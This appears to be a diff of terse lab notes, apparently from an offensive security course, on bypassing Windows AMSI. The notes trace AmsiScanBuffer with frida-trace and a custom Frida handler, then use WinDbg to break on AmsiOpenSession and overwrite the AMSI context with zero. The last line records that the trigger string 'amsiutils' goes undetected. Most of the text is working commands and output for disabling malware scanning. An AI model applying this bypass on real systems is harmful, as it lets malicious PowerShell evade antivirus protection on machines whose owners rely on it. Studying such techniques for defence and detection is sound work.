@@ -1,1 +1,50 @@
 
+Get-Process -name powershell 
+
+frida-trace -p 1184 -x amsi.dll -i Amsi*
+
+# Change the code at C:\Users\Offsec\__handlers__\amsi.dll\AmsiScanBuffer.js
+# Change onenter and onclose function
+
+onEnter: function (log, args, state) {
+  log('[*] AmsiScanBuffer()');
+  log('|- amsiContext: ' + args[0]);
+  log('|- buffer: ' + Memory.readUtf16String(args[1]));
+  log('|- length: ' + args[2]);
+  log('|- contentName ' + args[3]);
+  log('|- amsiSession ' + args[4]);
+  log('|- result ' + args[5] + "\n");
+  this.resultPointer = args[5];
+},
+
+onLeave: function (log, retval, state) {
+  log('[*] AmsiScanBuffer() Exit');
+  resultPointer = this.resultPointer;
+  log('|- Result value is: ' + Memory.readUShort(resultPointer) + "\n");
+}
+
+# Result:
+
+ 3391 ms  AmsiOpenSession()
+  3391 ms  [*] AmsiScanBuffer()
+  3391 ms  |- amsiContext: 0x177dcc39270
+
+dc 0x177dcc39270  -> AMSI
+
+u amsi!AmsiOpenSession
+
+u amsi!AmsiOpenSession+0x4b L2
+
+bp amsi!AmsiOpenSession
+
+g
+
+dc rcx L1
+
+ed rcx 0
+
+dc rcx L1
+
+g
+
+'amsiutils' -> No detection
